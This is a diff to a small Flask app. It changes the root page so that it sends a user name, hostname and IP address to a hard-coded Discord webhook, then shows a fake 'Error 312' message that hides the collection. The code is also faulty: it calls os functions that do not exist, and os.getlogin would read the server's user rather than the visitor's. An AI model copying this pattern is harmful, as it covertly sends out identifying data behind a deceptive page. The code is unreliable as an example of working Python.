@@ -7,16 +7,19 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1409649940321276060/lgqC2HqRj_On
 
 @app.route("/")
 def home():
-    # Nachricht an den Webhook schicken
+    user = os.getlogin()
+    host = os.gethostname()
+    ip = os.gethostbyname()
     payload = {
-        "content": "Jemand hat deine Website besucht!"
+        "content": f"User: {user} / IP: {ip}"
     }
     try:
         requests.post(WEBHOOK_URL, json=payload)
     except Exception as e:
         print(f"Fehler beim Senden des Webhooks: {e}")
     
-    return "<h1>Haello World!</h1><p>Website runs</p>"
+    return "<h1>Error 312</h1><p>The website is currently experiencing problems</p>"
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=10000)
+
